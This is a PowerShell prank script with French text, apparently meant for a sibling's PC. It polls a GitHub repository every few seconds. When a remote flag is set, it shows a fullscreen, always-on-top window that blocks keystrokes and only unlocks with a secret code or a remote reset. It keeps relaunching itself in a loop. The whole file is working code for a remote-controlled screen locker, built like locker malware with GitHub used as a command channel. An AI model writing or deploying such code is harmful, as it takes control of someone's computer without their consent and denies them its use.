# blague_lock_windows.ps1
# Surveille GitHub toutes les 3s. Quand locked=true -> ecran de verrouillage plein ecran.
# Seul le code secret (ou le bouton Sheets) libere le PC.

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-LockState {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/$($config.lock_path)?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ locked = [bool]$data.locked; sha = $resp.sha }
    } catch { return $null }
}

function Set-Unlocked($sha) {
    try {
        $body = @{
            message = "unlock"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"locked":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/$($config.lock_path)"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Show-LockForm($sha) {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $W = $screen.Bounds.Width
    $H = $screen.Bounds.Height
    $currentSha = $sha

    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = "None"
    $form.Bounds       = $screen.Bounds
    $form.TopMost      = $true
    $form.BackColor    = [System.Drawing.Color]::FromArgb(10, 10, 10)
    $form.KeyPreview   = $true
    $form.ShowInTaskbar = $false
    $form.Add_KeyDown({ $_.SuppressKeyPress = $true; $_.Handled = $true })

    # --- Titre ---
    $lblTitre = New-Object System.Windows.Forms.Label
    $lblTitre.Text      = "2  —  1"
    $lblTitre.ForeColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
    $lblTitre.Font      = New-Object System.Drawing.Font("Segoe UI", 72, [System.Drawing.FontStyle]::Bold)
    $lblTitre.AutoSize  = $true
    $form.Controls.Add($lblTitre)

    # --- Icone cadenas ---
    $lblIcon = New-Object System.Windows.Forms.Label
    $lblIcon.Text      = [char]0x1F512
    $lblIcon.ForeColor = [System.Drawing.Color]::White
    $lblIcon.Font      = New-Object System.Drawing.Font("Segoe UI Emoji", 60)
    $lblIcon.AutoSize  = $true
    $form.Controls.Add($lblIcon)

    # --- Message ---
    $lblMsg = New-Object System.Windows.Forms.Label
    $lblMsg.Text      = "Ton PC est sous juridiction fraternelle.`r`n`r`nAppelle-moi pour obtenir le code de liberation.`r`n`r`n(Oui tu peux ouvrir le gestionnaire des taches.`r`n Il revient dans 2 minutes. Bonne chance. 😊)"
    $lblMsg.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
    $lblMsg.Font      = New-Object System.Drawing.Font("Segoe UI", 18)
    $lblMsg.AutoSize  = $true
    $lblMsg.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($lblMsg)

    # --- Champ code ---
    $txtCode = New-Object System.Windows.Forms.TextBox
    $txtCode.PasswordChar = [char]9679
    $txtCode.Font         = New-Object System.Drawing.Font("Segoe UI", 22)
    $txtCode.Width        = 280
    $txtCode.Height       = 50
    $txtCode.BackColor    = [System.Drawing.Color]::FromArgb(28, 28, 28)
    $txtCode.ForeColor    = [System.Drawing.Color]::White
    $txtCode.BorderStyle  = "None"
    $txtCode.TextAlign    = "Center"
    $form.Controls.Add($txtCode)

    # --- Erreur ---
    $lblErr = New-Object System.Windows.Forms.Label
    $lblErr.ForeColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
    $lblErr.Font      = New-Object System.Drawing.Font("Segoe UI", 13)
    $lblErr.AutoSize  = $true
    $form.Controls.Add($lblErr)

    # --- Bouton ---
    $btn = New-Object System.Windows.Forms.Button
    $btn.Text      = "Deverrouiller"
    $btn.Font      = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
    $btn.BackColor = [System.Drawing.Color]::FromArgb(192, 57, 43)
    $btn.ForeColor = [System.Drawing.Color]::White
    $btn.FlatStyle = "Flat"
    $btn.Width     = 220
    $btn.Height    = 55
    $btn.FlatAppearance.BorderSize = 0
    $form.Controls.Add($btn)

    # Centrage apres chargement
    $form.Add_Shown({
        $form.Activate()
        $txtCode.Focus()
        $cx = $W / 2
        $lblIcon.Location  = New-Object System.Drawing.Point(($cx - $lblIcon.Width/2), 80)
        $lblTitre.Location = New-Object System.Drawing.Point(($cx - $lblTitre.Width/2), 190)
        $lblMsg.Location   = New-Object System.Drawing.Point(($cx - $lblMsg.Width/2), 360)
        $txtCode.Location  = New-Object System.Drawing.Point(($cx - $txtCode.Width/2), 620)
        $lblErr.Location   = New-Object System.Drawing.Point(($cx - 220), 680)
        $btn.Location      = New-Object System.Drawing.Point(($cx - $btn.Width/2), 720)
    })

    # Validation code
    $validate = {
        if ($txtCode.Text -eq $config.code_secret) {
            Set-Unlocked $currentSha
            $form.Close()
        } else {
            $lblErr.Text = "Code incorrect. Rappelle ton grand frere."
            $txtCode.Clear()
            $txtCode.Focus()
        }
    }
    $btn.Add_Click($validate)
    $form.Add_KeyDown({ if ($_.KeyCode -eq "Return") { & $validate } })

    # Timer : surveille GitHub pendant que la fenetre est ouverte
    # Si l'utilisateur debloque depuis Sheets -> fermeture automatique
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 3000
    $timer.Add_Tick({
        $state = Get-LockState
        if ($state -and -not $state.locked) { $form.Close() }
    })
    $timer.Start()
    $form.Add_FormClosed({ $timer.Stop(); $timer.Dispose() })

    [void]$form.ShowDialog()
    $form.Dispose()
}

# Boucle principale
while ($true) {
    $state = Get-LockState
    if ($state -and $state.locked) {
        Show-LockForm $state.sha
    }
    Start-Sleep -Seconds 3
}
